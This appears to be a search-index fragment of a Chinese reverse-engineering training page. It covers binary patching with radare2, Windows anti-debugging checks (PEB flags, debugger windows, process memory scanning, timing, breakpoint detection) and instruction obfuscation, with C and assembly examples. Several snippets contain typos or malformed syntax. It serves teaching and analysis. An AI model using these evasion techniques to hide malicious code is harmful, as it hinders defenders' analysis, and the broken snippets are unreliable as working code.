<p>\u5f53\u7136\u8fd8\u53ef\u4ee5\u5c06\u8fd9\u4e00\u8fc7\u7a0b\u66f4\u52a0\u7b80\u5316\uff0c\u76f4\u63a5\u8f93\u5165\u6c47\u7f16\uff0c\u5176\u4ed6\u7684\u4e8b\u60c5 r2 \u4f1a\u5e2e\u4f60\u641e\u5b9a\uff1a</p> <pre><code>[0x004005da]&gt; wa call 0x004004c0\nWritten 5 bytes (call 0x004004c0) = wx e8e1feffff\n[0x004005da]&gt; wa call sym.imp.puts\nWritten 5 bytes (call sym.imp.puts) = wx e8e1feffff\n</code></pre>"},{"location":"Training/Material/Reverse/#patch_3","title":"\u4f7f\u7528\u5de5\u5177 patch","text":""},{"location":"Training/Material/Reverse/#patchkit","title":"patchkit","text":"<p>patchkit \u53ef\u4ee5\u8ba9\u6211\u4eec\u901a\u8fc7 Python \u811a\u672c\u6765 patch ELF \u4e8c\u8fdb\u5236\u6587\u4ef6\u3002</p>"},{"location":"Training/Material/Reverse/#_51","title":"\u53cd\u8c03\u8bd5\u6280\u672f","text":"<ul> <li>\u4ec0\u4e48\u662f\u53cd\u8c03\u8bd5</li> <li>\u53cd\u8c03\u8bd5\u6280\u672f</li> <li>\u53c2\u8003\u8d44\u6599</li> </ul>"},{"location":"Training/Material/Reverse/#_52","title":"\u4ec0\u4e48\u662f\u53cd\u8c03\u8bd5","text":"<p>\u53cd\u8c03\u8bd5\u662f\u4e00\u79cd\u91cd\u8981\u7684\u8f6f\u4ef6\u4fdd\u62a4\u6280\u672f\uff0c\u7279\u522b\u662f\u5728\u5404\u79cd\u6e38\u620f\u4fdd\u62a4\u4e2d\u88ab\u5c24\u5176\u91cd\u89c6\u3002\u53e6\u5916\uff0c\u6076\u610f\u4ee3\u7801\u5f80\u5f80\u4e5f\u4f1a\u5229\u7528\u53cd\u8c03\u8bd5\u6765\u5bf9\u6297\u5b89\u5168\u5206\u6790\u3002\u5f53\u7a0b\u5e8f\u610f\u8bc6\u5230\u81ea\u5df1\u53ef\u80fd\u5904\u4e8e\u8c03\u8bd5\u4e2d\u7684\u65f6\u5019\uff0c\u53ef\u80fd\u4f1a\u6539\u53d8\u6b63\u5e38\u7684\u6267\u884c\u8def\u5f84\u6216\u8005\u4fee\u6539\u81ea\u8eab\u7a0b\u5e8f\u8ba9\u81ea\u5df1\u5d29\u6e83\uff0c\u4ece\u800c\u589e\u52a0\u8c03\u8bd5\u65f6\u95f4\u548c\u590d\u6742\u5ea6\u3002</p>"},{"location":"Training/Material/Reverse/#_53","title":"\u53cd\u8c03\u8bd5\u6280\u672f","text":"<p>\u4e0b\u9762\u5148\u4ecb\u7ecd\u51e0\u79cd Windows \u4e0b\u7684\u53cd\u8c03\u8bd5\u65b9\u6cd5\u3002</p>"},{"location":"Training/Material/Reverse/#_54","title":"\u51fd\u6570\u68c0\u6d4b","text":"<p>\u51fd\u6570\u68c0\u6d4b\u5c31\u662f\u901a\u8fc7 Windows \u81ea\u5e26\u7684\u516c\u5f00\u6216\u672a\u516c\u5f00\u7684\u51fd\u6570\u76f4\u63a5\u68c0\u6d4b\u7a0b\u5e8f\u662f\u5426\u5904\u4e8e\u8c03\u8bd5\u72b6\u6001\u3002\u6700\u7b80\u5355\u7684\u8c03\u8bd5\u5668\u68c0\u6d4b\u51fd\u6570\u662f <code>IsDebuggerPresent()</code>\uff1a</p> <pre><code>BOOL WINAPI IsDebuggerPresent(void);\n</code></pre> <p>\u8be5\u51fd\u6570\u67e5\u8be2\u8fdb\u7a0b\u73af\u5883\u5757\uff08PEB\uff09\u4e2d\u7684 <code>BeingDebugged</code> \u6807\u5fd7\uff0c\u5982\u679c\u8fdb\u7a0b\u5904\u5728\u8c03\u8bd5\u4e0a\u4e0b\u6587\u4e2d\uff0c\u5219\u8fd4\u56de\u4e00\u4e2a\u975e\u96f6\u503c\uff0c\u5426\u5219\u8fd4\u56de\u96f6\u3002</p> <p>\u793a\u4f8b\uff1a</p> <pre><code>BOOL CheckDebug()  \n{  \n    return IsDebuggerPresent();  \n}\n</code></pre> <p><code>CheckRemoteDebuggerPresent()</code> \u7528\u4e8e\u68c0\u6d4b\u4e00\u4e2a\u8fdc\u7a0b\u8fdb\u7a0b\u662f\u5426\u5904\u4e8e\u8c03\u8bd5\u72b6\u6001\uff1a</p> <pre><code>BOOL WINAPI CheckRemoteDebuggerPresent(\n  _In_    HANDLE hProcess,\n  _Inout_ PBOOL  pbDebuggerPresent\n);\n</code></pre> <p>\u5982\u679c <code>hProcess</code> \u53e5\u67c4\u8868\u793a\u7684\u8fdb\u7a0b\u5904\u4e8e\u8c03\u8bd5\u4e0a\u4e0b\u6587\uff0c\u5219\u8bbe\u7f6e <code>pbDebuggerPresent</code> \u53d8\u91cf\u88ab\u8bbe\u7f6e\u4e3a <code>TRUE</code>\uff0c\u5426\u5219\u88ab\u8bbe\u7f6e\u4e3a <code>FALSE</code>\u3002</p> <pre><code>BOOL CheckDebug()  \n{  \n    BOOL ret;  \n    CheckRemoteDebuggerPresent(GetCurrentProcess(), &amp;ret);  \n    return ret;  \n}\n</code></pre> <p><code>NtQueryInformationProcess</code> \u7528\u4e8e\u83b7\u53d6\u7ed9\u5b9a\u8fdb\u7a0b\u7684\u4fe1\u606f\uff1a</p> <pre><code>NTSTATUS WINAPI NtQueryInformationProcess(\n  _In_      HANDLE           ProcessHandle,\n  _In_      PROCESSINFOCLASS ProcessInformationClass,\n  _Out_     PVOID            ProcessInformation,\n  _In_      ULONG            ProcessInformationLength,\n  _Out_opt_ PULONG           ReturnLength\n);\n</code></pre> <p>\u7b2c\u4e8c\u4e2a\u53c2\u6570 <code>ProcessInformationClass</code> \u7ed9\u5b9a\u4e86\u9700\u8981\u67e5\u8be2\u7684\u8fdb\u7a0b\u4fe1\u606f\u7c7b\u578b\u3002\u5f53\u7ed9\u5b9a\u503c\u4e3a <code>0</code>\uff08<code>ProcessBasicInformation</code>\uff09\u6216 <code>7</code>\uff08<code>ProcessDebugPort</code>\uff09\u65f6\uff0c\u5c31\u80fd\u5f97\u5230\u76f8\u5173\u8c03\u8bd5\u4fe1\u606f\uff0c\u8fd4\u56de\u4fe1\u606f\u4f1a\u5199\u5230\u7b2c\u4e09\u4e2a\u53c2\u6570 <code>ProcessInformation</code> \u6307\u5411\u7684\u7f13\u51b2\u533a\u4e2d\u3002</p> <p>\u793a\u4f8b\uff1a</p> <pre><code>BOOL CheckDebug()\n{\n    DWORD dbgport = 0;\n    HMODULE hModule = LoadLibrary(\"Ntdll.dll\");\n    NtQueryInformationProcessPtr NtQueryInformationProcess = (NtQueryInformationProcessPtr)GetProcAddress(hModule, \"NtQueryInformationProcess\");\n    NtQueryInformationProcess(GetCurrentProcess(), 7, &amp;dbgPort, sizeof(dbgPort), NULL);\n    return dbgPort != 0;\n}\n</code></pre>"},{"location":"Training/Material/Reverse/#_55","title":"\u6570\u636e\u68c0\u6d4b","text":"<p>\u6570\u636e\u68c0\u6d4b\u662f\u6307\u7a0b\u5e8f\u901a\u8fc7\u6d4b\u8bd5\u4e00\u4e9b\u4e0e\u8c03\u8bd5\u76f8\u5173\u7684\u5173\u952e\u4f4d\u7f6e\u7684\u6570\u636e\u6765\u5224\u65ad\u662f\u5426\u5904\u4e8e\u8c03\u8bd5\u72b6\u6001\u3002\u6bd4\u5982\u4e0a\u9762\u6240\u8bf4\u7684 PEB \u4e2d\u7684 <code>BeingDebugged</code> \u53c2\u6570\u3002\u6570\u636e\u68c0\u6d4b\u5c31\u662f\u76f4\u63a5\u5b9a\u4f4d\u5230\u8fd9\u4e9b\u6570\u636e\u5730\u5740\u5e76\u6d4b\u8bd5\u5176\u4e2d\u7684\u6570\u636e\uff0c\u4ece\u800c\u907f\u514d\u8c03\u7528\u51fd\u6570\uff0c\u4f7f\u7a0b\u5e8f\u7684\u884c\u4e3a\u66f4\u52a0\u9690\u853d\u3002</p> <p>\u793a\u4f8b\uff1a</p> <pre><code>BOOL CheckDebug()\n{\n    int BeingDebug = 0;\n    __asm\n    {\n        mov eax, dword ptr fs:[30h]   ; \u6307\u5411PEB\u57fa\u5730\u5740\n        mov eax, dword ptr [eax+030h]\n        movzx eax, byte ptr [eax+2]\n        mov BeingDebug, eax\n    }\n    return BeingDebug != 0;\n}\n</code></pre> <p>\u7531\u4e8e\u8c03\u8bd5\u5668\u4e2d\u542f\u52a8\u7684\u8fdb\u7a0b\u4e0e\u6b63\u5e38\u542f\u52a8\u7684\u8fdb\u7a0b\u521b\u5efa\u5806\u7684\u65b9\u5f0f\u6709\u4e9b\u4e0d\u540c\uff0c\u7cfb\u7edf\u4f7f\u7528 PEB \u7ed3\u6784\u504f\u79fb\u91cf 0x68 \u5904\u7684\u4e00\u4e2a\u672a\u516c\u5f00\u7684\u4f4d\u7f6e\uff0c\u6765\u51b3\u5b9a\u5982\u679c\u521b\u5efa\u5806\u7ed3\u6784\u3002\u5982\u679c\u8fd9\u4e2a\u4f4d\u7f6e\u4e0a\u7684\u503c\u4e3a <code>0x70</code>\uff0c\u5219\u8fdb\u7a0b\u5904\u4e8e\u8c03\u8bd5\u5668\u4e2d\u3002</p> <p>\u793a\u4f8b\uff1a</p> <pre><code>BOOL CheckDebug()\n{\n    int BeingDbg = 0;\n    __asm\n    {\n        mov eax, dword ptr fs:[30h]\n        mov eax, dword ptr [eax + 68h]\n        and eax, 0x70\n        mov BeingDbg, eax\n    }\n    return BeingDbg != 0;\n}\n</code></pre>"},{"location":"Training/Material/Reverse/#_56","title":"\u7b26\u53f7\u68c0\u6d4b","text":"<p>\u7b26\u53f7\u68c0\u6d4b\u4e3b\u8981\u9488\u5bf9\u4e00\u4e9b\u4f7f\u7528\u4e86\u9a71\u52a8\u7684\u8c03\u8bd5\u5668\u6216\u76d1\u89c6\u5668\uff0c\u8fd9\u7c7b\u8c03\u8bd5\u5668\u5728\u542f\u52a8\u540e\u4f1a\u521b\u5efa\u76f8\u5e94\u7684\u9a71\u52a8\u94fe\u63a5\u7b26\u53f7\uff0c\u4ee5\u7528\u4e8e\u5e94\u7528\u5c42\u4e0e\u5176\u9a71\u52a8\u7684\u901a\u4fe1\u3002\u4f46\u7531\u4e8e\u8fd9\u4e9b\u7b26\u53f7\u4e00\u822c\u90fd\u6bd4\u8f83\u56fa\u5b9a\uff0c\u6240\u4ee5\u5c31\u53ef\u4ee5\u901a\u8fc7\u8fd9\u4e9b\u7b26\u53f7\u6765\u786e\u5b9a\u662f\u5426\u5b58\u5728\u76f8\u5e94\u7684\u8c03\u8bd5\u8f6f\u4ef6\u3002</p> <p>\u793a\u4f8b\uff1a</p> <pre><code>BOOL CheckDebug()\n{\n    HANDLE hDevice = CreateFileA(\"\\\\\\\\.\\\\PROCEXP153\", GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0);\n    if (hDevice)\n    {\n        return 0;\n    }\n}\n</code></pre>"},{"location":"Training/Material/Reverse/#_57","title":"\u7a97\u53e3\u68c0\u6d4b","text":"<p>\u7a97\u53e3\u68c0\u6d4b\u901a\u8fc7\u68c0\u6d4b\u5f53\u524d\u684c\u9762\u4e2d\u662f\u5426\u5b58\u5728\u7279\u5b9a\u7684\u8c03\u8bd5\u7a97\u53e3\u6765\u5224\u65ad\u662f\u5426\u5b58\u5728\u8c03\u8bd5\u5668\uff0c\u4f46\u4e0d\u80fd\u5224\u65ad\u8be5\u8c03\u8bd5\u5668\u662f\u5426\u6b63\u5728\u8c03\u8bd5\u8be5\u7a0b\u5e8f\u3002</p> <p>\u793a\u4f8b\uff1a</p> <pre><code>BOOL CheckDebug()\n{\n    if (FindWindowA(\"OllyDbg\", 0))\n    {\n        return 0;\n    }\n    return 1;\n}\n</code></pre>"},{"location":"Training/Material/Reverse/#_58","title":"\u7279\u5f81\u7801\u68c0\u6d4b","text":"<p>\u7279\u5f81\u7801\u68c0\u6d4b\u679a\u4e3e\u5f53\u524d\u6b63\u5728\u8fd0\u884c\u7684\u8fdb\u7a0b\uff0c\u5e76\u5728\u8fdb\u7a0b\u7684\u5185\u5b58\u7a7a\u95f4\u4e2d\u641c\u7d22\u7279\u5b9a\u8c03\u8bd5\u5668\u7684\u4ee3\u7801\u7247\u6bb5\u3002</p> <p>\u4f8b\u5982 OllyDbg \u6709\u8fd9\u6837\u4e00\u6bb5\u7279\u5f81\u7801\uff1a</p> <pre><code>0x41, 0x00, 0x62, 0x00, 0x6f, 0x00, 0x75, 0x00, 0x74, 0x00,\n0x20, 0x00, 0x4f, 0x00, 0x6c, 0x00, 0x6c, 0x00, 0x79, 0x00,\n0x44, 0x00, 0x62, 0x00, 0x67, 0x00, 0x00, 0x00, 0x4f, 0x00,\n0x4b, 0x00, 0x00, 0x00\n</code></pre> <p>\u793a\u4f8b\uff1a</p> <pre><code>BOOL CheckDebug()\n{\n    BYTE sign[] = {0x41, 0x00, 0x62, 0x00, 0x6f, 0x00, 0x75, 0x00, 0x74, 0x00,\n                0x20, 0x00, 0x4f, 0x00, 0x6c, 0x00, 0x6c, 0x00, 0x79, 0x00,\n                0x44, 0x00, 0x62, 0x00, 0x67, 0x00, 0x00, 0x00, 0x4f, 0x00,\n                0x4b, 0x00, 0x00, 0x00;}\n\n    PROCESSENTRY32 sentry32 = {0};\n    sentry32.dwSize = sizeof(sentry32);\n    HANDLE phsnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\n\n    Process32First(phsnap, &amp;sentry32);\n    do{\n        HANDLE hps = OpenProcess(MAXIMUM_ALLOWED, FALSE, sentry32.th32ProcessID);\n        if (hps != 0)\n        {\n            DWORD szReaded = 0;\n            BYTE signRemote[sizeof(sign)];\n            ReadProcessMemory(hps, (LPCVOID)0x4f632a, signRemote, sizeof(signRemote), &amp;szReaded);\n            if (szReaded &gt; 0)\n            {\n                if (memcmp(sign, signRemote, sizeof(sign)) == 0)\n                {\n                    CloseHandle(phsnap);\n                    return 0;\n                }\n            }\n        }\n    }\n    sentry32.dwSize = sizeof(sentry32);\n}while(Process32Next(phsnap, &amp;sentry32));\n</code></pre>"},{"location":"Training/Material/Reverse/#_59","title":"\u884c\u4e3a\u68c0\u6d4b","text":"<p>\u884c\u4e3a\u68c0\u6d4b\u662f\u6307\u5728\u7a0b\u5e8f\u4e2d\u901a\u8fc7\u4ee3\u7801\u611f\u77e5\u7a0b\u5e8f\u5904\u4e8e\u8c03\u8bd5\u65f6\u4e0e\u672a\u5904\u4e8e\u8c03\u8bd5\u65f6\u7684\u5404\u79cd\u5dee\u5f02\u6765\u5224\u65ad\u7a0b\u5e8f\u662f\u5426\u5904\u4e8e\u8c03\u8bd5\u72b6\u6001\u3002\u4f8b\u5982\u6211\u4eec\u5728\u8c03\u8bd5\u65f6\u6b65\u8fc7\u4e24\u6761\u6307\u4ee4\u6240\u82b1\u8d39\u7684\u65f6\u95f4\u8fdc\u8fdc\u8d85\u8fc7 CPU \u6b63\u5e38\u6267\u884c\u82b1\u8d39\u7684\u65f6\u95f4\uff0c\u4e8e\u662f\u5c31\u53ef\u4ee5\u901a\u8fc7 <code>rdtsc</code> \u6307\u4ee4\u6765\u8fdb\u884c\u6d4b\u8bd5\u3002\uff08\u8be5\u6307\u4ee4\u7528\u4e8e\u5c06\u65f6\u95f4\u6807\u7b7e\u8ba1\u6570\u5668\u8bfb\u5165 <code>EDX:EAX</code> \u5bc4\u5b58\u5668\uff09</p> <p>\u793a\u4f8b\uff1a</p> <pre><code>BOOL CheckDebug()\n{\n    int BeingDbg = 0;\n    __asm\n    {\n        rdtsc\n        mov ecx, edx\n        rdtsc\n        sub edx, ecx\n        mov BeingDbg, edx\n    }\n    if (BeingDbg &gt; 2)\n    {\n        return 0;\n    }\n    return 1;\n}\n</code></pre>"},{"location":"Training/Material/Reverse/#_60","title":"\u65ad\u70b9\u68c0\u6d4b","text":"<p>\u65ad\u70b9\u68c0\u6d4b\u662f\u6839\u636e\u8c03\u8bd5\u5668\u8bbe\u7f6e\u65ad\u70b9\u7684\u539f\u7406\u6765\u68c0\u6d4b\u8f6f\u4ef6\u4ee3\u7801\u4e2d\u662f\u5426\u8bbe\u7f6e\u4e86\u65ad\u70b9\u3002\u8c03\u8bd5\u5668\u4e00\u822c\u4f7f\u7528\u4e24\u8005\u65b9\u6cd5\u8bbe\u7f6e\u4ee3\u7801\u65ad\u70b9\uff1a</p> <ul> <li>\u901a\u8fc7\u4fee\u6539\u4ee3\u7801\u6307\u4ee4\u4e3a INT3\uff08\u673a\u5668\u7801\u4e3a0xCC\uff09\u89e6\u53d1\u8f6f\u4ef6\u5f02\u5e38</li> <li>\u901a\u8fc7\u786c\u4ef6\u8c03\u8bd5\u5bc4\u5b58\u5668\u8bbe\u7f6e\u786c\u4ef6\u65ad\u70b9</li> </ul> <p>\u9488\u5bf9\u8f6f\u4ef6\u65ad\u70b9\uff0c\u68c0\u6d4b\u7cfb\u7edf\u4f1a\u626b\u63cf\u6bd4\u8f83\u91cd\u8981\u7684\u4ee3\u7801\u533a\u57df\uff0c\u770b\u662f\u5426\u5b58\u5728\u591a\u4f59\u7684 INT3 \u6307\u4ee4\u3002</p> <p>\u793a\u4f8b\uff1a</p> <pre><code>BOOL CheckDebug()\n{\n    PIMAGE_DOS_HEADER pDosHeader;\n    PIMAGE_NT_HEADERS32 pNtHeaders;\n    PIMAGE_SECTION_HEADER pSectionHeader;\n    DWORD dwBaseImage = (DWORD)GetModuleHandle(NULL);\n    pDosHeader = (PIMAGE_DOS_HEADER)dwBaseImage;\n    pNtHeaders = (PIMAGE_NT_HEADERS32)((DWORD)pDosHeader + pDosHeader-&gt;e_lfanew);\n    pSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)pNtHeaders + sizeof(pNtHeaders-&gt;Signature) + sizeof(IMAGE_FILE_HEADER) +\n                     (WORD)pNtHeaders-&gt;FileHeader.SizeOfOptionalHeader);\n    DWORD dwAddr = pSectionHeader-&gt;VirtualAddress + dwBaseImage;\n    DWORD dwCodeSize = pSectionHeader-&gt;SizeOfRawData;\n    BOOL Found = FALSE;\n    __asm\n    {\n        cld\n        mov     edi,dwAddr\n        mov     ecx,dwCodeSize\n        mov     al,0CCH\n        repne   scasb   ; \u5728EDI\u6307\u5411\u5927\u5c0f\u4e3aECX\u7684\u7f13\u51b2\u533a\u4e2d\u641c\u7d22AL\u5305\u542b\u7684\u5b57\u8282\n        jnz     NotFound\n        mov Found,1\nNotFound:\n    }\n    return Found;\n}\n</code></pre> <p>\u800c\u5bf9\u4e8e\u786c\u4ef6\u65ad\u70b9\uff0c\u7531\u4e8e\u7a0b\u5e8f\u5de5\u4f5c\u5728\u4fdd\u62a4\u6a21\u5f0f\u4e0b\uff0c\u65e0\u6cd5\u8bbf\u95ee\u786c\u4ef6\u8c03\u8bd5\u65ad\u70b9\uff0c\u6240\u4ee5\u4e00\u822c\u9700\u8981\u6784\u5efa\u5f02\u5e38\u7a0b\u5e8f\u6765\u83b7\u53d6 DR \u5bc4\u5b58\u5668\u7684\u503c\u3002</p> <p>\u793a\u4f8b\uff1a</p> <pre><code>BOOL CheckDebug()\n{\n    CONTEXT context;  \n    HANDLE hThread = GetCurrentThread();  \n    context.ContextFlags = CONTEXT_DEBUG_REGISTERS;  \n    GetThreadContext(hThread, &amp;context);  \n    if (context.Dr0 != 0 || context.Dr1 != 0 || context.Dr2 != 0 || context.Dr3!=0)\n    {  \n        return 1;  \n    }  \n    return 0;  \n}\n</code></pre>"},{"location":"Training/Material/Reverse/#_61","title":"\u884c\u4e3a\u5360\u7528","text":"<p>\u884c\u4e3a\u5360\u7528\u662f\u6307\u5728\u9700\u8981\u4fdd\u62a4\u7684\u7a0b\u5e8f\u4e2d\uff0c\u7a0b\u5e8f\u81ea\u8eab\u5c06\u4e00\u4e9b\u53ea\u80fd\u540c\u65f6\u6709 1 \u4e2a\u5b9e\u4f8b\u7684\u529f\u80fd\u5360\u4e3a\u5df1\u7528\u3002\u6bd4\u5982\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u4e00\u4e2a\u8fdb\u7a0b\u53ea\u80fd\u540c\u65f6\u88ab 1 \u4e2a\u8c03\u8bd5\u5668\u8c03\u8bd5\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u8bbe\u8ba1\u4e00\u79cd\u6a21\u5f0f\uff0c\u5c06\u7a0b\u5e8f\u4ee5\u8c03\u8bd5\u65b9\u5f0f\u542f\u52a8\uff0c\u7136\u540e\u5229\u7528\u7cfb\u7edf\u7684\u8c03\u8bd5\u673a\u5236\u9632\u6b62\u88ab\u5176\u4ed6\u8c03\u8bd5\u5668\u8c03\u8bd5\u3002</p>"},{"location":"Training/Material/Reverse/#_62","title":"\u6307\u4ee4\u6df7\u6dc6","text":"<ul> <li>\u4e3a\u4ec0\u4e48\u9700\u8981\u6307\u4ee4\u6df7\u6dc6</li> <li>\u5e38\u89c1\u7684\u6df7\u6dc6\u65b9\u6cd5</li> <li>\u4ee3\u7801\u865a\u62df\u5316</li> </ul>"},{"location":"Training/Material/Reverse/#_63","title":"\u4e3a\u4ec0\u4e48\u9700\u8981\u6307\u4ee4\u6df7\u6dc6","text":"<p>\u8f6f\u4ef6\u7684\u5b89\u5168\u6027\u4e25\u91cd\u4f9d\u8d56\u4e8e\u4ee3\u7801\u590d\u6742\u5316\u540e\u88ab\u5206\u6790\u8005\u7406\u89e3\u7684\u96be\u5ea6\uff0c\u901a\u8fc7\u6307\u4ee4\u6df7\u6dc6\uff0c\u53ef\u4ee5\u5c06\u539f\u59cb\u7684\u4ee3\u7801\u6307\u4ee4\u8f6c\u6362\u4e3a\u7b49\u4ef7\u4f46\u6781\u5176\u590d\u6742\u7684\u6307\u4ee4\uff0c\u4ece\u800c\u5c3d\u53ef\u80fd\u5730\u63d0\u9ad8\u5206\u6790\u548c\u7834\u89e3\u7684\u6210\u672c\u3002</p>"},{"location":"Training/Material/Reverse/#_64","title":"\u5e38\u89c1\u7684\u6df7\u6dc6\u65b9\u6cd5","text":""},{"location":"Training/Material/Reverse/#_65","title":"\u4ee3\u7801\u53d8\u5f62","text":"<p>\u4ee3\u7801\u53d8\u5f62\u662f\u6307\u5c06\u5355\u6761\u6216\u591a\u6761\u6307\u4ee4\u8f6c\u53d8\u4e3a\u7b49\u4ef7\u7684\u5355\u6761\u6216\u591a\u6761\u5176\u4ed6\u6307\u4ee4\u3002\u5176\u4e2d\u5bf9\u5355\u6761\u6307\u4ee4\u7684\u53d8\u5f62\u53eb\u505a\u5c40\u90e8\u53d8\u5f62\uff0c\u5bf9\u591a\u6761\u6307\u4ee4\u7ed3\u5408\u8d77\u6765\u8003\u8651\u7684\u53d8\u6210\u53eb\u505a\u5168\u5c40\u53d8\u5f62\u3002</p> <p>\u4f8b\u5982\u4e0b\u9762\u8fd9\u6837\u7684\u4e00\u6761\u8d4b\u503c\u6307\u4ee4\uff1a</p> <pre><code>mov eax, 12345678h\n</code></pre> <p>\u53ef\u4ee5\u4f7f\u7528\u4e0b\u9762\u7684\u7ec4\u5408\u6307\u4ee4\u6765\u66ff\u4ee3\uff1a</p> <pre><code>push 12345678h\npop eax\n</code></pre> <p>\u66f4\u8fdb\u4e00\u6b65\uff1a</p> <pre><code>pushfd\nmov eax, 1234\nshl eax, 10\nmov ax, 5678\npopfd\n</code></pre> <p><code>pushfd</code> \u548c <code>popfd</code> \u662f\u4e3a\u4e86\u4fdd\u62a4 EFLAGS \u5bc4\u5b58\u5668\u4e0d\u53d7\u53d8\u5f62\u540e\u6307\u4ee4\u7684\u5f71\u54cd\u3002</p> <p>\u7ee7\u7eed\u66ff\u6362\uff1a</p> <pre><code>pushfd\npush 1234\npop eax\nshl eax, 10\nmov ax 5678\n</code></pre> <p>\u8fd9\u6837\u7684\u7ed3\u679c\u5c31\u662f\u7b80\u5355\u7684\u6307\u4ee4\u4e5f\u53ef\u80fd\u4f1a\u53d8\u6210\u4e0a\u767e\u4e0a\u5343\u6761\u6307\u4ee4\uff0c\u5927\u5927\u63d0\u9ad8\u4e86\u7406\u89e3\u7684\u96be\u5ea6\u3002</p> <p>\u518d\u770b\u4e0b\u9762\u7684\u4f8b\u5b50\uff1a</p> <pre><code>jmp {label}\n</code></pre> <p>\u53ef\u4ee5\u53d8\u6210\uff1a</p> <pre><code>push {label}\nret\n</code></pre> <p>\u800c\u4e14 IDA \u4e0d\u80fd\u8bc6\u522b\u51fa\u8fd9\u79cd label \u6807\u7b7e\u7684\u8c03\u7528\u7ed3\u6784\u3002</p> <p>\u6307\u4ee4\uff1a</p> <pre><code>call {label}\n</code></pre> <p>\u53ef\u4ee5\u66ff\u6362\u6210\uff1a</p> <pre><code>push {call\u6307\u4ee4\u540e\u9762\u7684\u90a3\u4e2alabel}\npush {label}\nret\n</code></pre> <p>\u6307\u4ee4\uff1a</p> <pre><code>push {op}\n</code></pre> <p>\u53ef\u4ee5\u66ff\u6362\u6210\uff1a</p> <pre><code>sub esp, 4\nmov [esp], {op}\n</code></pre> <p>\u4e0b\u9762\u6211\u4eec\u6765\u770b\u770b\u5168\u5c40\u53d8\u5f62\u3002\u5bf9\u4e8e\u4e0b\u9762\u7684\u4ee3\u7801\uff1a</p> <pre><code>mov eax, ebx\nmov ecx, eax\n</code></pre> <p>\u56e0\u4e3a\u4e24\u6761\u4ee3\u7801\u5177\u6709\u5173\u8054\u6027\uff0c\u5728\u53d8\u5f62\u65f6\u9700\u8981\u7efc\u5408\u8003\u8651\uff0c\u4f8b\u5982\u4e0b\u9762\u8fd9\u6837\uff1a</p> <pre><code>mov cx, bx\nmov ax, cx\nmov ch, bh\nmov ah, bh\n</code></pre> <p>\u8fd9\u79cd\u5177\u6709\u5173\u8054\u6027\u7684\u7279\u5b9a\u4f7f\u5f97\u901a\u8fc7\u53d8\u5f62\u540e\u7684\u4ee3\u7801\u63a8\u5bfc\u53d8\u5f62\u524d\u7684\u4ee3\u7801\u66f4\u52a0\u56f0\u96be\u3002</p>"},{"location":"Training/Material/Reverse/#_66","title":"\u82b1\u6307\u4ee4","text":"<p>\u82b1\u6307\u4ee4\u5c31\u662f\u5728\u539f\u59cb\u6307\u4ee4\u4e2d\u63d2\u5165\u4e00\u4e9b\u867d\u7136\u53ef\u4ee5\u88ab\u6267\u884c\u4f46\u662f\u6ca1\u6709\u4efb\u4f55\u4f5c\u7528\u7684\u6307\u4ee4\uff0c\u5b83\u7684\u51fa\u73b0\u53ea\u662f\u4e3a\u4e86\u6270\u4e71\u5206\u6790\uff0c\u4e0d\u4ec5\u662f\u5bf9\u5206\u6790\u8005\u6765\u8bf4\uff0c\u8fd8\u662f\u5bf9\u53cd\u6c47\u7f16\u5668\u3001\u8c03\u8bd5\u5668\u6765\u8bf4\u3002</p> <p>\u6765\u770b\u4e2a\u4f8b\u5b50\uff0c\u539f\u59cb\u6307\u4ee4\u5982\u4e0b\uff1a</p> <pre><code>add eax, ebx\nmul ecx\n</code></pre> <p>\u52a0\u5165\u82b1\u6307\u4ee4\u4e4b\u540e\uff1a</p> <pre><code>xor esi, 011223344h\nadd esi, eax\nadd eax, ebx\nmov edx, eax\nshl edx, 4\nmul ecx\nxor esi, ecx\n</code></pre> <p>\u5176\u4e2d\u4f7f\u7528\u4e86\u6e90\u7a0b\u5e8f\u4e0d\u4f1a\u4f7f\u7528\u5230\u7684 esi \u548c edx \u5bc4\u5b58\u5668\u3002\u8fd9\u5c31\u662f\u4e00\u79cd\u7eaf\u7cb9\u7684\u5783\u573e\u6307\u4ee4\u3002</p> <p>\u6709\u7684\u82b1\u6307\u4ee4\u7528\u4e8e\u5e72\u6270\u53cd\u6c47\u7f16\u5668\uff0c\u4f8b\u5982\u4e0b\u9762\u8fd9\u6837\uff1a</p> <pre><code>01003689    50          push eax\n0100368A    53          push ebx\n</code></pre> <p>\u52a0\u5165\u82b1\u6307\u4ee4\u540e\uff1a</p> <pre><code>01003689    50          push eax\n0100368A    EB 01       jmp short 0100368D\n0100368C    FF53 6A     call dword ptr [ebx+6A]\n</code></pre> <p>\u4e4d\u4e00\u770b\u4f3c\u4e4e\u5f88\u5947\u602a\uff0c\u5176\u5b9e\u662f\u52a0\u5165\u56e0\u4e3a\u52a0\u5165\u4e86\u673a\u5668\u7801 <code>EB 01 FF</code>\uff0c\u4f7f\u5f97\u7ebf\u6027\u5206\u6790\u7684\u53cd\u6c47\u7f16\u5668\u4ea7\u751f\u4e86\u8bef\u5224\u3002\u800c\u5728\u6267\u884c\u65f6\uff0c\u7b2c\u4e8c\u6761\u6307\u4ee4\u4f1a\u8df3\u8f6c\u5230\u6b63\u786e\u7684\u4f4d\u7f6e\uff0c\u6d41\u7a0b\u5982\u4e0b\uff1a</p> <pre><code>01003689    50          push eax\n0100368A    EB 01       jmp short 0100368D\n0100368C    90          nop\n0100368D    53          push ebx\n</code></pre>"},{"location":"Training/Material/Reverse/#_67","title":"\u6270\u4e71\u6307\u4ee4\u5e8f\u5217","text":"<p>\u6307\u4ee4\u4e00\u822c\u90fd\u662f\u6309\u7167\u4e00\u5b9a\u5e8f\u5217\u6267\u884c\u7684\uff0c\u4f8b\u5982\u4e0b\u9762\u8fd9\u6837\uff1a</p> <pre><code>01003689    push eax\n0100368A    push ebx\n0100368B    xor eax, eax\n0100368D    cmp eax, 0\n01003690    jne short 01003695\n01003692    inc eax\n01003693    jmp short 0100368D\n01003695    pop ebx\n01003696    pop eax\n</code></pre> 